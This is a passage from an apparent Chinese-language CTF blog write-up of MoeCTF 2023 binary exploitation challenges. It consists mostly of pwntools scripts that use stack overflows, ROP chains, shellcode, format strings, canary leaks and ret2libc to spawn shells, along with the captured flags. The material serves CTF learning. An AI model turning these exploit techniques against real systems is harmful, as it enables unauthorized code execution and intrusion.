class="string">b&#x27;a&#x27;</span> * (<span class="number">80</span> + <span class="number">8</span>) <span class="comment"># offset r</span></span><br><span class="line">payload += p64(ret_address) <span class="comment"># ret</span></span><br><span class="line">payload += p64(gadget_address) <span class="comment"># pop rdi ret</span></span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;zqCYX9rID5N8EvdK6cRpjzxGiKua-j6-&#125;</span><br></pre></td></tr></table></figure>



<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>64位 syscall会根据rax的值去调用系统，其中有个execve的函数能够执行shell命令，编号是59。</p>
<p>用法是先设置rax的值为59来选择execve这个函数</p>
<p>然后设置rdi rsi rdx 三个寄存器传递&#x2F;bin&#x2F; sh null null三个参数过去</p>
<p>最后syscall就好了</p>
<p>32位和64位不同的是传参的调用约定和编号</p>
<p><a target="_blank" rel="noopener" href="https://www.yuque.com/cyberangel/rg9gdm/iszq8p">https://www.yuque.com/cyberangel/rg9gdm/iszq8p</a></p>
<p><a target="_blank" rel="noopener" href="https://publicki.top/old/syscall.html#x86_64-64_bit">https://publicki.top/old/syscall.html#x86_64-64_bit</a> </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./ret2syscall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.129.194&quot;</span></span><br><span class="line">port = <span class="number">57614</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process()</span></span><br><span class="line">p = remote(ip,port) <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">line = p.recvline() ; <span class="built_in">print</span>(line) <span class="comment"># Can you make a syscall?</span></span><br><span class="line"></span><br><span class="line">syscall_addr = <span class="number">0x401185</span></span><br><span class="line">pop_rax_ret = <span class="number">0x40117e</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x401180</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x401182</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x401183</span></span><br><span class="line">pop_rsi_rdx_ret = <span class="number">0x401182</span></span><br><span class="line">binsh = <span class="number">0x404040</span></span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">b&#x27;a&#x27;</span> * (<span class="number">64</span> + <span class="number">8</span>), <span class="comment"># offset r</span></span><br><span class="line">        pop_rax_ret, <span class="number">59</span>, <span class="comment"># execve(&quot;/bin/sh&quot; , NULL , NULL)</span></span><br><span class="line">        pop_rdi_ret, binsh ,</span><br><span class="line">        pop_rsi_rdx_ret , <span class="number">0</span> , <span class="number">0</span> ,</span><br><span class="line">        syscall_addr</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;3e8lLsjSF62Ebm55dV_11iZHHp7TFVUZ&#125;</span><br></pre></td></tr></table></figure>



<h2 id="shellcode-level2"><a href="#shellcode-level2" class="headerlink" title="shellcode_level2"></a>shellcode_level2</h2><p>这里如果输入数据的第一个字节不为0的话，test al al 会将zf寄存器设置成1，然后会jz初始化我输入的数据，所以只需要保证第一个字节是0x00就好了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lea     rax, [rbp+s]</span><br><span class="line">movzx   eax, byte ptr [rax]</span><br><span class="line">test    al, al</span><br><span class="line">jz      short loc_125D</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lea     rax, [rbp+s]</span><br><span class="line">mov     edx, 64h ; &#x27;d&#x27;  ; n</span><br><span class="line">mov     esi, 0          ; c</span><br><span class="line">mov     rdi, rax        ; s</span><br><span class="line">call    _memset</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">loc_125D:</span><br><span class="line">lea     rax, [rbp+s]</span><br><span class="line">add     rax, 1</span><br><span class="line">mov     [rbp+var_78], rax</span><br><span class="line">mov     rdx, [rbp+var_78]</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    rdx</span><br><span class="line">mov     eax, 0</span><br><span class="line">mov     rdx, [rbp+var_8]</span><br><span class="line">sub     rdx, fs:28h</span><br><span class="line">jz      short locret_128D</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.129.194&quot;</span></span><br><span class="line">port = <span class="number">63480</span></span><br><span class="line">p = remote(ip, port)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./shellcode_level2&quot;)</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">shellcode = <span class="string">b&#x27;\x00&#x27;</span> + shellcode</span><br><span class="line">payload = shellcode <span class="comment"># #</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;5WxAPxrGkQOTgaLi3fXkBZV8IKQEDBPF&#125;</span><br></pre></td></tr></table></figure>



<h2 id="uninitialized-key-plus"><a href="#uninitialized-key-plus" class="headerlink" title="uninitialized_key_plus"></a>uninitialized_key_plus</h2><p>和uninitialized_key类似，区别在get_name函数那是scanf %24s，然后位置有些不太一样ida里面看内存布局算一下就好了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">ip = &quot;192.168.129.194&quot;</span><br><span class="line">port = 49771</span><br><span class="line">p = remote(ip, port)</span><br><span class="line"># p = process(&quot;./uninitialized_key_plus&quot;)</span><br><span class="line"></span><br><span class="line">line = p.recvline(); print(line) # Welcome to Moectf 2023.</span><br><span class="line">line = p.recvline(); print(line) # Do you know stack?</span><br><span class="line">line = p.recvline(); print(line) # Please input your name:</span><br><span class="line"></span><br><span class="line">payload = b&#x27;A&#x27; * 20</span><br><span class="line">payload += p32(114514) # 转四字节</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">line = p.recvline(); print(line) # Your name is %s.\n</span><br><span class="line">line = p.recvline(); print(line) # Please input your key:</span><br><span class="line"></span><br><span class="line">p.sendline(b&#x27;=&#x27;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;HEPwrkfbVLeO2t_8ea0K6PipJiGm2DQP&#125;</span><br></pre></td></tr></table></figure>



<h2 id="format-level1-补"><a href="#format-level1-补" class="headerlink" title="format_level1[补]"></a>format_level1[补]</h2><p>格式化字符串修改 dragon.HP 就好了，修改pwner的atk 字符串会长一些，输入长度不够</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./format_level1&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;192.168.1.101&quot;</span></span><br><span class="line">    port = <span class="number">54822</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">r_leek_libc_64 = <span class="keyword">lambda</span> : u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r_leek_libc_32 = <span class="keyword">lambda</span> : u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>,&#123;<span class="number">0x804c00c</span>:<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;Input what you want to talk: \n&quot;</span>,payload)</span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="little-canary-补"><a href="#little-canary-补" class="headerlink" title="little_canary[补]"></a>little_canary[补]</h2><p>第一次read 覆盖canary的低位00把canary打印出来，然后带上canary打ret2libc ，题目没有给libc，所以要用libcsearcher一下</p>
<p>ret2libc的话，构造一个 puts_plt(puts_got)的函数调用去打印一个libc的地址，算出libc_base后，libc中有binsh字符和system函数，就可以构造一个system(&#x2F;bin&#x2F;sh)的函数调用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./little_canary&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;192.168.1.101&quot;</span></span><br><span class="line">    port = <span class="number">64352</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">r_leek_libc_64 = <span class="keyword">lambda</span> : u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r_leek_libc_32 = <span class="keyword">lambda</span> : u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x50</span> - <span class="number">8</span> + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;What&#x27;s your name?\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">r(<span class="built_in">len</span>(payload))</span><br><span class="line">leak_canary = <span class="string">b&#x27;\x00&#x27;</span> + r(<span class="number">7</span>)</span><br><span class="line">success(leak_canary)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x0000000000401343</span></span><br><span class="line">payload = flat([</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x50</span> - <span class="number">8</span>),leak_canary,<span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span>,</span><br><span class="line">    rdi,elf.got[<span class="string">&#x27;puts&#x27;</span>],elf.plt[<span class="string">&#x27;puts&#x27;</span>],</span><br><span class="line">    elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&quot;I put a canary on my stack!\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak_addr = u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># libc_base = leak_addr - libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,leak_addr)</span><br><span class="line">libc_base = leak_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">f&quot;libc_base -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x000000000040101a</span> </span><br><span class="line"><span class="comment"># system = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment"># binsh = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))</span></span><br><span class="line"></span><br><span class="line">system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x50</span> - <span class="number">8</span>),leak_canary,<span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span>,</span><br><span class="line">    ret,rdi,binsh,system</span><br><span class="line"></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;What&#x27;s your name?\n&quot;</span>,payload)</span><br><span class="line">sa(<span class="string">b&quot;I put a canary on my stack!\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="rePWNse-补"><a href="#rePWNse-补" class="headerlink" title="rePWNse[补]"></a>rePWNse[补]</h2><p>题目中有给 设置好的execve的模板，有pop rdi ret的gadget，但是没有binsh字符串，需要在makebinsh中构造一个binsh字符串。</p>
<p>这个makebinsh函数第一眼看觉得挺复杂的，但是细看会发现就是一个一元一次方程的约束求解，其中有一些 strncat((char *)s, &amp;src[v7[1]], 1uLL); 通过v7[i] 来做下标的表达式，是可以直接看出v7[i]的值。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">__int64 makebinsh()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned <span class="built_in">int</span> v0; // eax</span><br><span class="line">  <span class="built_in">int</span> v1; // eax</span><br><span class="line">  <span class="built_in">int</span> v2; // eax</span><br><span class="line">  <span class="built_in">int</span> v3; // eax</span><br><span class="line">  <span class="built_in">int</span> v4; // eax</span><br><span class="line">  <span class="built_in">int</span> v5; // eax</span><br><span class="line">  <span class="built_in">int</span> v7[<span class="number">8</span>]; // [rsp+0h] [rbp-70h] BYREF</span><br><span class="line">  char src[<span class="number">64</span>]; // [rsp+20h] [rbp-50h] BYREF</span><br><span class="line">  void *s; // [rsp+60h] [rbp-10h]</span><br><span class="line">  <span class="built_in">int</span> i; // [rsp+6Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  strcpy(src, <span class="string">&quot;/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>);</span><br><span class="line">  s = malloc(8uLL);</span><br><span class="line">  memset(s, <span class="number">0</span>, 8uLL);</span><br><span class="line">  v0 = time(0LL);</span><br><span class="line">  srand(v0);</span><br><span class="line">  puts(<span class="string">&quot;Input seven single digits:&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">6</span>; ++i )</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7[i]);</span><br><span class="line">  <span class="keyword">if</span> ( v7[<span class="number">3</span>] * v7[<span class="number">1</span>] == <span class="number">10</span> * v7[<span class="number">4</span>] + v7[<span class="number">5</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    strncat((char *)s, src, 1uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = rand();</span><br><span class="line">    strncat((char *)s, &amp;src[(<span class="built_in">int</span>)(<span class="number">53.0</span> * ((double)v1 / <span class="number">2147483647.0</span>))], 1uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v7[<span class="number">5</span>] == v7[<span class="number">6</span>] + <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    strncat((char *)s, &amp;src[<span class="number">2</span>], 1uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = rand();</span><br><span class="line">    strncat((char *)s, &amp;src[(<span class="built_in">int</span>)(<span class="number">53.0</span> * ((double)v2 / <span class="number">2147483647.0</span>))], 1uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  strncat((char *)s, &amp;src[v7[<span class="number">1</span>]], 1uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v7[<span class="number">1</span>] == v7[<span class="number">3</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    strncat((char *)s, &amp;src[<span class="number">14</span>], 1uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = rand();</span><br><span class="line">    strncat((char *)s, &amp;src[(<span class="built_in">int</span>)(<span class="number">53.0</span> * ((double)v3 / <span class="number">2147483647.0</span>))], 1uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  strncat((char *)s, &amp;src[v7[<span class="number">6</span>]], 1uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v7[<span class="number">0</span>] == v7[<span class="number">2</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    strncat((char *)s, &amp;src[<span class="number">19</span>], 1uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = rand();</span><br><span class="line">    strncat((char *)s, &amp;src[(<span class="built_in">int</span>)(<span class="number">53.0</span> * ((double)v4 / <span class="number">2147483647.0</span>))], 1uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v7[<span class="number">3</span>] - v7[<span class="number">4</span>] == v7[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    strncat((char *)s, &amp;src[<span class="number">8</span>], 1uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = rand();</span><br><span class="line">    strncat((char *)s, &amp;src[(<span class="built_in">int</span>)(<span class="number">53.0</span> * ((double)v5 / <span class="number">2147483647.0</span>))], 1uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  printf(<span class="string">&quot;Here&#x27;s the string:%s\n&quot;</span>, (const char *)s);</span><br><span class="line">  printf(<span class="string">&quot;The address is:%p\n&quot;</span>, s);</span><br><span class="line">  <span class="keyword">return</span> 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大约是这些约束，算了一下 得出的v7[]的结果是 1919810</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot;/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># v7[3] * v7[1] == 10 * v7[4] + v7[5]</span></span><br><span class="line">result += <span class="built_in">str</span>[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># v7[5] == v7[6] + 1</span></span><br><span class="line">result += <span class="built_in">str</span>[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># strncat((char *)s, &amp;src[v7[1]], 1uLL); v7[1] == 9</span></span><br><span class="line"><span class="comment"># print(str.find(&#x27;i&#x27;))</span></span><br><span class="line">result += <span class="built_in">str</span>[<span class="built_in">str</span>.find(<span 